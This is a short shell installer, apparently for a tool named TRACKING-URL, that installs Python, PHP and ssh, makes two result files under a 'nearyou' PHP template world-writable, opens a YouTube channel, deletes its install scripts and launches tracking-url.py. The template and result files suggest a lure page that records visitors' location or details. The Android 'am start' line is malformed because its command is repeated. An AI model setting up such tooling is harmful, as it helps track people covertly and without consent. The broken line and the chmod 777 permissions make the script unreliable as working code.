echo '[!] Updating...'
apt-get update > install.log
echo
echo '[!] Installing Dependencies...'
echo '    Python3'
apt-get -y install python3 python3-pip &>> install.log
echo '    PHP'
apt-get -y install php &>> install.log
echo '    ssh'
apt-get -y install openssh &>> install.log
echo '    Requests'
pip3 install requests &>> install.log
echo
echo '[!] Setting Permissions...'
chmod 777 template/nearyou/php/info.txt
chmod 777 template/nearyou/php/result.txt
echo
echo '[!] Installed.'
am start -a android.intent.action.VIEW -d am start -a android.intent.action.VIEW -d https://www.youtube.com/channel/UCLTkYtIJaFAopdiJ5ZqPQAw
cd $HOME/TRACKING-URL
rm install.sh
rm arch_install.sh
rm termux_install.sh
python tracking-url.py

